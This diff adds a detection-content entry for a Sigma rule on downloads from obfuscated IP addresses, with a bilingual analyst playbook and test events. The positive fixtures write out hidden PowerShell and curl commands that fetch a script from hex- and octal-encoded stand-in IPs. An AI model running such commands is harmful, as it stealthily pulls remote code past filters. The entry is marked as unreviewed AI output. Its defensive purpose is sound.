@@ -1,0 +1,124 @@
+{
+  "rule": {
+    "id": "cb5a2333-56cf-4562-8fcb-22ba1bca728d",
+    "title": "Obfuscated IP Download Activity",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), X__Junior (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_susp_obfuscated_ip_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_susp_obfuscated_ip_download.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó un comando de descarga (Invoke-WebRequest, curl, wget, DownloadString, etc.) hacia una URL cuya dirección IP está codificada en hexadecimal, octal, decimal entero o URL-encoding. Es una técnica común para evadir filtros y revisiones de IOC.",
+      "what_it_detects": "Eventos de creación de procesos en Windows con un CommandLine que tiene un comando de descarga y una IP ofuscada, como //0x, octetos con ceros a la izquierda, un entero largo o http://% con %2e. La regla excluye las URL que tienen una IPv4 normal en formato decimal con puntos.",
+      "why_it_matters": "Los usuarios legítimos casi nunca escriben IP en hexadecimal u octal. Este formato sirve para descargar payloads o scripts sin activar listas de bloqueo ni reglas basadas en IP. Corresponde a la transferencia de herramientas al equipo (ingress tool transfer) con ofuscación. La regla está etiquetada como discovery.",
+      "triage_steps": [
+        "Revise el CommandLine completo y decodifique la IP a formato decimal con puntos. Por ejemplo, 0xC0000201 o 0300.0000.0002.0001 equivalen a 192.0.2.1.",
+        "Busque la IP decodificada en inteligencia de amenazas, el proxy y el firewall. Determine si es interna, conocida o nunca vista en la organización.",
+        "Analice el ParentImage y la cadena de procesos: Office, wscript, mshta, un navegador o un servicio como padre aumentan la sospecha.",
+        "Identifique al usuario y el host. Confirme si la persona suele usar PowerShell o curl y si la actividad ocurrió en horario normal.",
+        "En el mismo host, en una ventana de +/- 15 minutos, busque archivos creados (-OutFile, -o), procesos hijos y ejecución de scripts descargados.",
+        "Revise las conexiones de red del host hacia la IP decodificada y si hubo transferencia de datos.",
+        "Busque alertas anteriores del mismo host, del mismo usuario y de la misma IP en otros endpoints."
+      ],
+      "false_positives": [
+        "La regla indica falsos positivos desconocidos. Es poco común en uso legítimo.",
+        "Pruebas de red teaming, pentesting o ejercicios de detección autorizados.",
+        "Investigadores o administradores que prueban el parseo de URL o los filtros del proxy con IP codificadas."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con el responsable del equipo si la ejecución estaba autorizada. Valide que la prueba esté documentada.",
+        "Si no está autorizada, aísle el endpoint desde el EDR y bloquee la IP decodificada en el proxy y el firewall.",
+        "Obtenga el archivo descargado y su hash antes de cualquier limpieza. Analícelo en sandbox y busque ese hash en otros equipos.",
+        "Elimine los artefactos y la persistencia que haya confirmado, restablezca las credenciales del usuario si hubo ejecución y restaure el equipo desde una imagen confiable si es necesario."
+      ],
+      "severity_rationale": "El nivel medio es adecuado: la combinación es muy sospechosa, pero por sí sola no confirma que el payload se ejecutó ni que hubo compromiso."
+    },
+    "en": {
+      "summary": "A download command (Invoke-WebRequest, curl, wget, DownloadString, etc.) ran against a URL whose IP address is encoded in hex, octal, a single integer or URL encoding. This is a common trick to slip past filters and IOC reviews.",
+      "what_it_detects": "Windows process creation events with a CommandLine that has a download command plus an obfuscated IP, such as //0x, zero-padded octets, a long integer, or http://% with %2e. URLs with a normal dotted-decimal IPv4 address are excluded.",
+      "why_it_matters": "Legitimate users rarely type IP addresses in hex or octal. The format lets attackers fetch payloads or scripts without triggering IP blocklists or string matches. This is ingress tool transfer combined with obfuscation. The rule is tagged discovery.",
+      "triage_steps": [
+        "Read the full CommandLine and decode the IP to dotted decimal. For example, 0xC0000201 or 0300.0000.0002.0001 both equal 192.0.2.1.",
+        "Look up the decoded IP in threat intel, proxy and firewall logs. Is it internal, known, or never seen before?",
+        "Check the ParentImage and process tree. A parent like Office, wscript, mshta, a browser or a service raises suspicion.",
+        "Identify the user and host. Check whether this user normally runs PowerShell or curl, and whether the timing fits their usual hours.",
+        "On the same host, within +/- 15 minutes, look for written files (-OutFile, -o), child processes and execution of downloaded scripts.",
+        "Review network connections from the host to the decoded IP and how much data moved.",
+        "Search for earlier alerts on the same host, the same user, and the same IP on other endpoints."
+      ],
+      "false_positives": [
+        "The rule lists false positives as unknown. Legitimate use is rare.",
+        "Authorized red team, penetration test or detection validation exercises.",
+        "Administrators or researchers testing URL parsing or proxy filtering with encoded IPs."
+      ],
+      "response_steps": [
+        "Ask the user or the asset owner whether the run was authorized, and check that any test is documented.",
+        "If it was not authorized, isolate the endpoint through EDR and block the decoded IP at the proxy and firewall.",
+        "Collect the downloaded file and its hash before any cleanup. Analyze it in a sandbox and hunt for the hash on other hosts.",
+        "Remove confirmed artifacts and persistence. Reset the user's credentials if anything ran, and reimage the host if needed."
+      ],
+      "severity_rationale": "Medium fits: the combination is highly suspicious, but on its own it does not prove the payload ran or that the host is compromised."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell Invoke-WebRequest to a hex-encoded IP (0xC0000201 = 192.0.2.1), launched by Word",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri http://0xC0000201/update.ps1 -OutFile C:\\Users\\Public\\update.ps1\""
+        }
+      },
+      {
+        "description": "curl download from a dotted-octal IP (0300.0000.0002.0001 = 192.0.2.1)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0217.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "curl -s -o C:\\Users\\Public\\a.txt http://0300.0000.0002.0001/a.txt"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate Invoke-WebRequest to a normal dotted-decimal IP; no obfuscated IP pattern, and the valid-IP filter applies",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\admin.soporte",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -c \"Invoke-WebRequest -Uri http://192.0.2.10/tools/agent.msi -OutFile C:\\Temp\\agent.msi\""
+        }
+      },
+      {
+        "description": "Hex-encoded IP used with ping; there is no download command, so selection_command fails",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0305.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\PING.EXE",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "ping -n 2 0xC0000201"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
